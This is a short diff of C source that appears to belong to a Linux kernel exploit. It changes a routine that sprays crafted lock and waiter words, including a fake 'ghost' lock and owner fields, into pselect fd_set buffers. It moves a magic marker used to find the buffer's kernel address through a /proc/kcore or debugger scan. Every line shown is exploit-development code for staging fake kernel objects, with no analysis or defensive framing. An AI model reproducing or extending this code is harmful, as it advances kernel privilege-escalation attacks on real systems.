@@ -545,6 +545,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
        * owner@ex[3]=1 (NULL|HAS_WAITERS: the historically-proven clean
        * exit AFTER the dequeue — the dequeue IS the delivery erase).
        */
+      /* MAGIC (fdset word 14) — UNCONDITIONAL: gdb/kcore scan finds the
+       * REAL buffer address pre-spin (QEMU) / anchors the device hint. */
+      pselect_put_waiter_word(in, out, ex, words_per_set, 14,
+                              (uint64_t)PSELECT_MAGIC_WORD, "magic");
       uint64_t ghost_lock_word = ghost_lock;
       uint64_t ex_stamp[4] = {0, 0, 0, 0};
       int ghost_self_lock = 0;
@@ -639,11 +643,6 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           pselect_put_waiter_word(in, out, ex, words_per_set,
                                   lock_words[i].word, lock_words[i].value,
                                   lock_words[i].name);
-        { /* MAGIC (fdset word 14): /proc/kcore scan finds the REAL buffer
-           * address (QEMU root) → self-consistent ghost; device: anchor. */
-          pselect_put_waiter_word(in, out, ex, words_per_set, 14,
-                                  (uint64_t)PSELECT_MAGIC_WORD, "magic");
-        }
         pr_info("stack JC2 SELF-LOCK: ghost=%016llx lock=%016llx "
                 "root=leftmost=ghost owner=1 (delivery gate armed)\n",
                 (unsigned long long)g_ghost_kva,
